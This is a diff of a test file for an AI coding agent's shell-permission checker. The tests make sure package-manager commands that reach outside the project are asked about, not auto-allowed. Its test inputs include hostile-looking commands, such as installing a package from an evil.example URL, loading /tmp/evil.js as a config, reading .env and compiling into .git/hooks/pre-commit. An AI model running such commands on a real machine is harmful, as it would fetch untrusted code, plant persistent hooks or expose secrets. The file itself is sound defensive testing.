@@ -50,9 +50,12 @@ function preset(catalogue: Catalog, id: Preset["id"]) {
   return value!
 }
 
-function effects(presetValue: Preset, command: string) {
-  const parsed = Effect.runSync(ShellParse.scan(command, "bash", root))
-  return parsed.commands.map((item) => (covers(item.resource, presetValue.resources, root) ? "allow" : "ask"))
+const bash = "/bin/bash"
+
+// The resources as the shell tool builds them for `shell`, and whether the set covers each.
+function effects(presetValue: Preset, command: string, shell = bash) {
+  const parsed = Effect.runSync(ShellParse.scan(command, shell, root))
+  return parsed.commands.map((item) => (covers(item.resource, presetValue.resources, root, shell) ? "allow" : "ask"))
 }
 
 describe("permission setup catalog", () => {
@@ -74,7 +77,6 @@ describe("permission setup catalog", () => {
       "bun typecheck *",
       "bun lint *",
       "bun check *",
-      "bun build *",
       "bun --version *",
       "bun -v *",
       "bun --help *",
@@ -196,7 +198,7 @@ describe("permission setup catalog", () => {
       "ask",
     ])
     // A set stored while the install set still held `add *` stays limited to lockfile installs.
-    expect(covers("bun add https://evil.example/x.tgz", ["bun add *"], root)).toBe(false)
+    expect(covers("bun add https://evil.example/x.tgz", ["bun add *"], root, bash)).toBe(false)
   })
 
   test("holds no output helpers; chained helpers are left to the agent's rules", () => {
@@ -212,10 +214,19 @@ describe("permission setup catalog", () => {
     expect(effects(install, "head -n 5 < .env")).toEqual(["ask"])
     const resources = ["bun install 2>&1", "tail -30"]
     const rules = [{ action: "shell", resource: "tail *", effect: "allow" as const }]
-    expect(allowsRequest({ action: "shell", resources, rules, applied: install.resources, directory: root })).toBe(true)
-    expect(allowsRequest({ action: "shell", resources, rules: [], applied: install.resources, directory: root })).toBe(
-      false,
-    )
+    expect(
+      allowsRequest({ action: "shell", resources, rules, applied: install.resources, directory: root, shell: bash }),
+    ).toBe(true)
+    expect(
+      allowsRequest({
+        action: "shell",
+        resources,
+        rules: [],
+        applied: install.resources,
+        directory: root,
+        shell: bash,
+      }),
+    ).toBe(false)
   })
 
   test("never allows a redirected file read or write or a process substitution, even when the wildcard matches", () => {
@@ -273,13 +284,16 @@ describe("permission setup catalog", () => {
       expect(effects(install, `${manager} install --registry=https://evil.example`)).toEqual(["ask"])
       expect(effects(install, `${manager} install --global`)).toEqual(["ask"])
       expect(effects(install, `${manager} install {--prefix,/tmp/other}`)).toEqual(["ask"])
-      expect(effects(checks, `${manager} run test -- --prefix /tmp/other`)).toEqual(["allow"])
+      // Options after `--` go to the script, but a path there is still checked.
+      expect(effects(checks, `${manager} run test -- --prefix other`)).toEqual(["allow"])
+      expect(effects(checks, `${manager} run test -- --prefix /tmp/other`)).toEqual(["ask"])
+      expect(effects(checks, `${manager} run test -- --config=/tmp/evil.js`)).toEqual(["ask"])
       expect(effects(checks, `${manager} run test --watch=false`)).toEqual(["allow"])
       expect(effects(checks, `${manager} run lint --fix`)).toEqual(["allow"])
     }
   })
 
-  test("asks when a path argument before -- resolves outside the project", () => {
+  test("asks when a path argument resolves outside the project, before or after --", () => {
     const checks = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks")
     for (const command of [
       "bun test /tmp/evil.test.ts",
@@ -288,6 +302,9 @@ describe("permission setup catalog", () => {
       "bun test ~/evil.test.ts",
       "bun run test --coverage-dir=/tmp/out",
       "bun script/kilocode/metrics/check.ts /etc",
+      "bun test -- /tmp/evil.test.ts",
+      "bun run test -- /tmp/elsewhere",
+      "bun run test -- ../other-repo",
     ]) {
       expect(effects(checks, command)).toEqual(["ask"])
     }
@@ -297,10 +314,70 @@ describe("permission setup catalog", () => {
       "bun run test .",
       "bun test foo",
       "bun run test --watch=false",
-      "bun run test -- /tmp/elsewhere",
+      "bun run test -- src/foo.test.ts",
       "bun script/kilocode/metrics/check.ts",
     ]) {
       expect(effects(checks, command)).toEqual(["allow"])
+    }
+  })
+
+  test("asks for a glob, which the shell could expand to a path outside the project", () => {
+    const checks = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks")
+    for (const command of [
+      "bun test .?/x.test.ts",
+      "bun test [.][.]/x.test.ts",
+      "bun test src/*.test.ts",
+      'bun run test "src/**"',
+    ]) {
+      expect(effects(checks, command)).toEqual(["ask"])
+    }
+  })
+
+  test("leaves Bun's bundler out of the bun sets and asks for a stored set that still holds it", () => {
+    for (const presetValue of classify({ manager: "bun", kilo: true }).presets) {
+      expect(presetValue.resources).not.toContain("bun build *")
+      expect(effects(presetValue, "bun build ./a.ts --compile --outfile .git/hooks/pre-commit")).toEqual(["ask"])
+    }
+    expect(covers("bun build ./a.ts", ["bun build *"], root, bash)).toBe(false)
+    const bun = preset(classify({ manager: "bun", kilo: false }), "typescript-checks")
+    expect(effects(bun, "bun run build")).toEqual(["allow"])
+    for (const manager of ["pnpm", "yarn"] as const) {
+      const checks = preset(classify({ manager, kilo: false }), "typescript-checks")
+      expect(effects(checks, `${manager} build`)).toEqual(["allow"])
+    }
+  })
+
+  test("reads a command in the dialect of the shell that runs it", () => {
+    const checks = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks")
+    for (const shell of ["/bin/bash", "/bin/zsh", "/bin/sh", "pwsh", "powershell"]) {
+      expect(effects(checks, "bun run test", shell)).toEqual(["allow"])
+      expect(effects(checks, "bun test src/foo.test.ts", shell)).toEqual(["allow"])
+      expect(effects(checks, "bun test --cwd /tmp/other", shell)).toEqual(["ask"])
+    }
+    for (const command of [
+      // Splatting passes the items of a variable as arguments.
+      "$a = '--cwd','C:\\x'; bun run test @a",
+      "bun run test @a",
+      // Each item of an array is its own argument.
+      "bun run test --cwd,C:\\x",
+      "bun test C:\\Temp\\evil.test.ts",
+      "bun test 'C:\\Temp\\evil.test.ts'",
+      "bun test ..\\..\\evil.test.ts",
+      "bun test \\\\srv\\share\\evil.test.ts",
+      "bun test $env:TEMP\\evil.test.ts",
+      "bun test *.test.ts",
+    ]) {
+      expect(effects(checks, command, "pwsh")).toEqual(["ask"])
+    }
+    expect(effects(checks, "bun test (Get-Content x)", "pwsh")).toEqual(["ask", "ask"])
+    expect(effects(checks, "bun test src\\foo.test.ts", "pwsh")).toEqual(["allow"])
+  })
+
+  test("asks in a shell the scanner does not model", () => {
+    const checks = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks")
+    for (const shell of ["cmd.exe", "cmd", "/usr/bin/fish", "nu"]) {
+      expect(effects(checks, "bun run test", shell)).toEqual(["ask"])
+      expect(covers("bun test %TEMP%\\evil.test.ts", checks.resources, root, shell)).toBe(false)
     }
   })
 
@@ -339,7 +416,7 @@ describe("permission set rules", () => {
   const sets = preset(classify({ manager: "bun", kilo: false }), "typescript-checks").resources
 
   test("allows a request only when every resource is allowed by the rules or covered by the sets", () => {
-    const request = { action: "shell", rules: [], applied: sets, directory: root }
+    const request = { action: "shell", rules: [], applied: sets, directory: root, shell: bash }
     expect(allowsRequest({ ...request, resources: ["bun run test"] })).toBe(true)
     expect(allowsRequest({ ...request, resources: ["bun run test", "bun install"] })).toBe(false)
     expect(
@@ -353,9 +430,9 @@ describe("permission set rules", () => {
   })
 
   test("reports the command parts a set does not cover and asks for a command it cannot scan", async () => {
-    expect(await Effect.runPromise(missing("bun run test && git push", root, sets))).toEqual(["git push"])
-    expect(await Effect.runPromise(missing("bun run lint", root, sets))).toEqual([])
-    const opaque = await Effect.runPromise(missing("bun run test $(", root, sets))
+    expect(await Effect.runPromise(missing("bun run test && git push", root, sets, bash))).toEqual(["git push"])
+    expect(await Effect.runPromise(missing("bun run lint", root, sets, bash))).toEqual([])
+    const opaque = await Effect.runPromise(missing("bun run test $(", root, sets, bash))
     expect(opaque).toHaveLength(1)
     expect(opaque[0]).toStartWith("bun run test $(")
   })
